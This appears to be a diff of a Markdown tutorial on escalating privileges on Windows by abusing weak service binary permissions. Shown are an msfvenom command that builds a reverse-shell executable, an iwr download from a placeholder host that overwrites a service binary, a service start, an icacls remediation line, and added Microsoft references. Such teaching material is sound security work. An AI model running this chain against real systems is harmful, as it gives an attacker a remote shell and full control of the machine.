@@ -167,7 +167,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service
 4) Transfer and overwrite the Service2.exe file with the malicious binary:
 
 ```
-iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Filese\CustomSrv2\Service2.exe
+iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Files\CustomSrv2\Service2.exe
 ```
 
 5) Start the service with the following command or reboot the machine:
@@ -175,6 +175,7 @@ iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Filese\CustomSrv2\S
 ```
 sc start "Vulnerable Service 2"
 ```
+
 6) Verify the reverse shell on your Kali machine:
 
 ![Weak-Service-Binary-Permissions-Reverse-Shell](/Pictures/Weak-Service-Binary-Permissions-Reverse-Shell.png)
@@ -189,5 +190,7 @@ icacls "C:\Program Files\CustomSrv2\Service2.exe" /remove:g BUILTIN\Users:(M)
 
 ## References
 
+- [Introduction to Windows Services applications Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications)
+- [Hot to Create Windows Services Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/how-to-create-windows-services)
 - [Access Control Overview Microsoft](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/access-control)
 - [Establishing Windows File and Folder Level Permissions by UWEC](https://www.uwec.edu/kb/article/drives-establishing-windows-file-and-folder-level-permissions/)
